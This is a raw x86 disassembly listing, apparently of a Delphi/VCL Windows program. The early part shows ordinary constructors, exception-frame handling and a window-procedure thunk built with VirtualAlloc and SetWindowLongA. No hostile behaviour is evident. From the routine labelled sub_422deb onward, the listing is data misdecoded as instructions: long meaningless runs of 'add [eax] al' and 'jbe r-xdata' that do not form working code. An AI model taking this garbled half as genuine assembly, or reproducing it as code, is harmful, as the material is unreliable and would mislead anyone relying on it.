mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4223c8
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421ac8
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_421d7c
jmp r-xdata
mov eax esi
call sub_418de0
mov edx eax
mov eax edi
call sub_422508
lea eax [ edi + 0x50 ]
call sub_40d814
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_422428
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421d98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_422454
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_422470
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_42248c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_418cf8
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_422508
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418be8
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418cf8
cmp ebp eax
jne r-xdata
sub_422548
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421d7c
mov edx ebx
call sub_421b4c
sub_422574
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4225bc
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_40331c
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4225f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_422643
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42265c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_4226ab
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4226c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42272e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_422748
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_422791
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41b578
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4227ac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405b2c
xor eax eax
push ebp
push sub_422999
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_422972
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026ec
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_422961
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40270c
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403b7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4229a0
lea eax [ ebp + 0xc ]
call sub_405ab8
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403b7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_4229dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_422a3f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_422a70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_4190bc
mov edi eax
xor eax eax
push ebp
push sub_422ac5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422acc
mov eax [ rw-data ]
call sub_419120
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418cf8
call sub_40331c
inc esi
dec ebx
jne r-xdata
sub_422ae4
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_422b0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028e8
mov edx sub_422ae4
lea eax [ esi + 0x5 ]
call sub_422b04
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_422b04
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_422bc8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406e94
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_422b0c
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_422c7c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_422ba4
sub_422ca4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422d48
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d4f
retn
mov eax [ rw-data ]
call sub_4182e0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_422a70
xor edx edx
xor eax eax
call sub_41c60c
mov eax rw-data
call sub_40d814
call sub_4061e8
lea eax [ eax + 0xc ]
call sub_40d814
mov eax rw-data
call sub_40d814
mov eax rw-data
call sub_405ab8
mov eax sub_422adc
call sub_405954
mov eax rw-data
call sub_40d814
call sub_421394
mov eax rw-data
call sub_40d814
mov eax rw-data
call sub_405ab8
sub_422d54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422ddd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422de4
retn
call sub_421360
mov eax sub_422adc
call sub_40594c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d554
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405ad0
mov dl 0x1
mov eax [ r-xdata ]
call sub_417ba8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418f64
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418f64
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_422deb
add [ edi + 0x640000ff ] cl
jbe r-xdata
jns r-xdata
add [ eax - 0x1 ] dh
add [ eax ] al
jbe r-xdata
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] al
jbe r-xdata
jpe r-xdata
add [ ecx - 0x1 ] dh
add [ eax ] al
jbe r-xdata
inc [ fs : eax ]
add [ ebx - 0x1 ] bh
arpl di di
add [ edx - 0x1 ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] al
jbe r-xdata
jpo r-xdata
add [ edx - 0x1 ] dh
add [ eax ] al
jbe r-xdata
outsd
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi - 0x1 ] ah
add [ eax ] al
jbe r-xdata
inc [ gs : eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] bh
insd
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
jbe r-xdata
add [ edi + edi * 8 ] ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] al
jbe r-xdata
jl r-xdata
add [ ebx - 0x1 ] dh
add [ eax ] al
jbe r-xdata
pop edx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx - 0x1 ] dl
add [ eax ] al
jbe r-xdata
push eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi - 0x1 ] ah
add [ eax ] al
jbe r-xdata
inc [ bx + si ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi - 0x1 ] bh
add [ eax ] al
jbe r-xdata
pop eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi - 0x1 ] ch
add [ eax ] al
jbe r-xdata
add [ esi + esi * 2 + 0x49 ] ah
inc [ eax ]
add [ eax ] al
jbe r-xdata
jge r-xdata
add [ edi + edi * 8 ] dh
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
jbe r-xdata
inc ebp
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] bl
pop ebx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx - 0x1 ] dl
add [ eax ] al
jbe r-xdata
push ecx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax - 0x1 ] ch
add [ eax ] al
jbe r-xdata
push edx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx - 0x1 ] ch
add [ eax ] al
jbe r-xdata
push 0x640000ff
jbe r-xdata
add [ edi - 0x1 ] bh
inc ebx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx - 0x1 ] bl
add [ eax ] al
jbe r-xdata
pop ecx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax - 0x1 ] dl
add [ eax ] al
jbe r-xdata
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp - 0x1 ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] al
jbe r-xdata
jg r-xdata
add [ esi - 0x1 ] dh
add [ eax ] al
jbe r-xdata
xor bh bh
add [ eax ] al
jbe r-xdata
add [ edi - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc edi
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi - 0x1 ] bl
add [ eax ] al
jbe r-xdata
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
jbe r-xdata
pop esp
inc [ eax ]
add [ ebx - 0x1 ] dl
add [ eax ] al
jbe r-xdata
pop ebp
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] dl
push ebx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx - 0x1 ] ch
imul edi edi 0x76640000
dec ecx
add [ eax - 0x1 ] ah
add [ eax ] al
jbe r-xdata
dec edi
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi - 0x1 ] al
add [ eax ] al
jbe r-xdata
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc esp
inc [ eax ]
add [ ebx - 0x1 ] bl
add [ eax ] al
jbe r-xdata
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] al
jbe r-xdata
pushad
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi - 0x1 ] dh
add [ eax ] al
jbe r-xdata
cmp bh bh
add [ eax ] al
jbe r-xdata
add [ ecx ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
xor edi edi
add [ eax ] al
jbe r-xdata
add [ eax - 0x1 ] cl
add [ eax ] al
jbe r-xdata
xor bh bh
add [ eax ] al
jbe r-xdata
add [ ecx - 0x1 ] cl
add [ eax ] al
jbe r-xdata
dec eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi - 0x1 ] bl
add [ eax ] al
jbe r-xdata
pop edi
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi - 0x1 ] dl
add [ eax ] al
jbe r-xdata
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
jbe r-xdata
push esp
inc [ eax ]
add [ ebx - 0x1 ] ch
add [ eax ] al
jbe r-xdata
add [ eax ] al
jbe r-xdata
push 0xffffffff
add [ ecx - 0x1 ] ah
add [ eax ] al
jbe r-xdata
inc [ eax ]
add [ 0x640000ff ] dh
imul edi edi 0x0
add [ esi + esi * 2 + 0x49 ] ah
add [ edx - 0x1 ] ah
add [ eax ] al
jbe r-xdata
popad
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax - 0x1 ] bh
add [ eax ] al
jbe r-xdata
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
push [ eax ]
add [ ebx ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
cmp edi edi
add [ eax ] al
jbe r-xdata
add [ edx ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] al
jbe r-xdata
cmp al 0xff
add [ ebx ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
xor edi edi
add [ eax ] al
jbe r-xdata
add [ edx - 0x1 ] cl
add [ eax ] al
jbe r-xdata
dec ecx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax - 0x1 ] al
add [ eax ] al
jbe r-xdata
dec edx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi - 0x1 ] dl
add [ eax ] al
jbe r-xdata
push ebp
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
aas
add [ esi ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi ] dh
push edi
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi - 0x1 ] ch
add [ eax ] al
jbe r-xdata
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
jbe r-xdata
insb
inc [ eax ]
add [ eax ] al
jbe r-xdata
add [ ebx - 0x1 ] ah
add [ ecx - 0x1 ] bh
mov [ fs : eax ] edx
push sub_4230b4
add [ 0x640000ff ] bh
js r-xdata
add [ edi + edi * 8 ] bh
jbe r-xdata
cmp eax 0x640000ff
add [ edi + edi * 8 ] dh
add [ eax ] al
jbe r-xdata
xor al 0xff
add [ ebx - 0x1 ] cl
add [ eax ] al
jbe r-xdata
jbe r-xdata
xor eax 0x640000ff
add [ edi + edi * 8 ] cl
dec ebx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc ecx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax - 0x1 ] bl
add [ eax ] al
jbe r-xdata
inc edx
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx - 0x1 ] bl
add [ eax ] al
jbe r-xdata
retn
add [ esi + esi * 2 + 0x49 ] ah
add [ edi ] bh
add [ esi ] bh
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi ] ah
inc edx
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
aaa
add [ esi - 0x1 ] cl
add [ eax ] al
jbe r-xdata
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
jbe r-xdata
dec esp
inc [ eax ]
add [ ebx - 0x1 ] al
add [ eax ] al
jbe r-xdata
dec ebp
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004231 ] al
add [ eax ] al
add ah ch
jae r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
cmp bh bh
add [ eax ] al
jbe r-xdata
add [ edi - 0x1 ] cl
add [ eax ] al
jbe r-xdata
add [ ebx ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x4231 ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax eax
push ebp
push sub_4230ad
and bh bh
add [ eax ] al
push ebp
mov ebp esp
add [ ecx ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
cmp edi edi
add [ eax ] al
jbe r-xdata
add [ eax ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ ecx + esi + 0x66090042 ] bl
jo r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
push esp
inc esi
imul esp [ ebx + 0x4f ] 0x61726570
push [ fs : eax ]
rcl [ ebp + 0x68 ] 0xad
xor [ edx ] al
add [ edx ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
jb r-xdata
push 0x65737261
je r-xdata
popa
jne r-xdata
jae r-xdata
popad
insd
nop
hlt
je r-xdata
je r-xdata
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
outsd
outsb
lea eax [ eax ]
mov al [ 0x3004231 ]
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
adc [ edx ] dh
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
